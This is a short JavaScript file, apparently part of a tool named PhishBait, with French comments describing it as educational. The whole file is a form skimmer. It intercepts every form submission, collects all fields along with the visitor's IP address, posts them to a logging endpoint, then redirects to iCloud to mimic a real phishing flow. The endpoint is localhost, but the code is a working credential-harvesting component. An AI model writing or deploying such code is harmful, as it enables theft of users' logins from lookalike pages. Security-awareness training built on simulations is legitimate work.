// src/phishbait/phishbait.js
export default function initPhishBait() {
  console.log('[PhishBait] Initialisation du système éducatif');

  // Intercepte les soumissions de formulaire
  document.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const form = e.target;
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    // Envoi des données à notre endpoint
    try {
      const response = await fetch('http://localhost:3001/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ...data,
          ip: await getIP(),
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        // Redirection après capture (simule le comportement réel)
        window.location.href = 'https://www.icloud.com';
      }
    } catch (error) {
      console.error('[PhishBait] Erreur:', error);
    }
  });

  async function getIP() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  }
}

// Initialisation
initPhishBait();
